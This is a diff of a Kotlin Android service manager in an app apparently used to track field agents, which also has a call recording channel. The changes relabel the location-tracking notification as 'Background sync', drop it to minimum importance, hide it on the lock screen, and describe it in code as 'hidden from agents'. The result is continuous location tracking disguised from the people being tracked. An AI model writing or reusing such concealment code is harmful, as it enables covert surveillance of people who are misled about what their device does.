@@ -12,17 +12,19 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.callmap.agenttracker.domain.manager.ServiceManager
 import com.callmap.agenttracker.service.LocationService
+import com.callmap.agenttracker.util.TrackingLog
 import dagger.hilt.android.qualifiers.ApplicationContext
 import javax.inject.Inject
 import javax.inject.Singleton
 
 @Singleton
 class ServiceManagerImpl @Inject constructor(
-    @ApplicationContext private val context: Context
+    @ApplicationContext private val context: Context,
+    private val alarmScheduler: AlarmScheduler
 ) : ServiceManager {
 
     companion object {
-        private const val CHANNEL_LOCATION = "location_tracking_v4"
+        private const val CHANNEL_LOCATION = com.callmap.agenttracker.util.TrackingNotificationHelper.CHANNEL_ID
         private const val CHANNEL_FCM = "fcm_default_v1"
         private const val CHANNEL_RECORDING = "call_recording_channel"
     }
@@ -43,14 +45,15 @@ class ServiceManagerImpl @Inject constructor(
 
             // 1. Location Channel (Low importance, silent)
             val locationChannel = NotificationChannel(
-                CHANNEL_LOCATION, 
-                "Agent Tracking", 
-                NotificationManager.IMPORTANCE_LOW
+                CHANNEL_LOCATION,
+                "Background sync",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Continuous background location tracking"
+                description = "System channel for background location (hidden from agents)"
                 enableVibration(false)
                 setSound(null, null)
                 setShowBadge(false)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
             }
 
             // 2. FCM Channel (High importance, heads-up)
@@ -76,7 +79,7 @@ class ServiceManagerImpl @Inject constructor(
             }
 
             notificationManager.createNotificationChannels(listOf(locationChannel, fcmChannel, recordingChannel))
-            Log.d("ServiceManager", "Notification channels initialized: $CHANNEL_LOCATION, $CHANNEL_FCM, $CHANNEL_RECORDING")
+            TrackingLog.d("ServiceManager", "Notification channels initialized")
         }
     }
 
@@ -90,13 +93,18 @@ class ServiceManagerImpl @Inject constructor(
 
     override fun handleServiceLifecycle(trackingEnabled: Boolean) {
         val isRunning = isServiceRunning(LocationService::class.java)
-        Log.d("ServiceManager", "handleServiceLifecycle: trackingEnabled=$trackingEnabled, isRunning=$isRunning")
-        
+        TrackingLog.d("ServiceManager", "handleServiceLifecycle: tracking=$trackingEnabled, running=$isRunning")
+
         if (trackingEnabled) {
+            if (isRunning) return
+            if (alarmScheduler.hasUpcomingLocationWake()) {
+                TrackingLog.d("ServiceManager", "Skipping start — next location alarm pending")
+                return
+            }
             val intent = Intent(context, LocationService::class.java).apply {
                 action = LocationService.ACTION_START
             }
-            
+
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     context.startForegroundService(intent)
